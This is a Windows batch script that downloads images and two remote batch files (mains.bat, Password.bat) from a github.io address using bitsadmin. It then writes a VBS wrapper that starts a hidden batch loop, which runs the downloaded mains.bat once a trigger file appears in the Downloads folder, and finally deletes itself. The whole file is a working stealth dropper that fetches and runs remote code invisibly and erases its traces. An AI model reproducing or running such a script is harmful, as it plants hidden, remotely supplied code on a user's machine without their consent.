@echo off
cd "%USERPROFILE%/Documents/"
md MASTERFOLDER
 echo.>"%USERPROFILE%\Documents\MASTERFOLDER\passcheck.txt"
bitsadmin.exe /transfer "1" https://athdot.github.io/dwnld/1.jpg %USERPROFILE%\Documents\MASTERFOLDER\1.jpg

bitsadmin.exe /transfer "2" https://athdot.github.io/dwnld/2.jpg %USERPROFILE%\Documents\MASTERFOLDER\2.jpg

bitsadmin.exe /transfer "3" https://athdot.github.io/dwnld/3.jpg %USERPROFILE%\Documents\MASTERFOLDER\3.jpg

bitsadmin.exe /transfer "4" https://athdot.github.io/dwnld/4.jpg %USERPROFILE%\Documents\MASTERFOLDER\4.jpg

bitsadmin.exe /transfer "5" https://athdot.github.io/dwnld/5.jpg %USERPROFILE%\Documents\MASTERFOLDER\5.jpg

bitsadmin.exe /transfer "6" https://athdot.github.io/dwnld/6.jpg %USERPROFILE%\Documents\MASTERFOLDER\6.jpg

bitsadmin.exe /transfer "7" https://athdot.github.io/dwnld/7.jpg %USERPROFILE%\Documents\MASTERFOLDER\7.jpg

bitsadmin.exe /transfer "8" https://athdot.github.io/dwnld/8.png %USERPROFILE%\Documents\MASTERFOLDER\8.png

bitsadmin.exe /transfer "9" https://athdot.github.io/dwnld/9.gif %USERPROFILE%\Documents\MASTERFOLDER\mor.gif

bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/10.jpg %USERPROFILE%\Documents\MASTERFOLDER\trippymeme.jpg
bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/mains.bat %USERPROFILE%\Documents\MASTERFOLDER\mains.bat
bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/Password.bat %USERPROFILE%\Documents\MASTERFOLDER\Password.bat
@echo Set shell = WScript.CreateObject("Wscript.Shell")> invisible.vbs
@echo shell.Run("C:\Users\%USERNAME%\Documents\invisible.bat"),0,true>> invisible.vbs
@echo @echo off> invisible.bat
@echo :start>> invisible.bat
@echo IF EXIST %USERPROFILE%\Downloads\activate.txt (>> invisible.bat
@echo start %USERPROFILE%\Documents\MASTERFOLDER\mains.bat>> invisible.bat
@echo goto :check>> invisible.bat
@echo ) ELSE (>> invisible.bat
@echo goto :start>> invisible.bat
@echo )>> invisible.bat
@echo :check>> invisible.bat
@echo IF EXIST %USERPROFILE%\Documents\MASTERFOLDER\mains.bat (>> invisible.bat
@echo start %USERPROFILE%\Documents\MASTERFOLDER\mains.bat>> invisible.bat
@echo exit>> invisible.bat
@echo )>> invisible.bat
@echo goto :check>> invisible.bat
move %USERPROFILE%\Desktop\invisible.bat %USERPROFILE%\Documents\invisible.bat
move %USERPROFILE%\Desktop\invisible.vbs %USERPROFILE%\Documents\invisible.vbs

start %USERPROFILE%\Documents\\invisible.vbs
(goto) 2>nul & del "%~f0"
exit
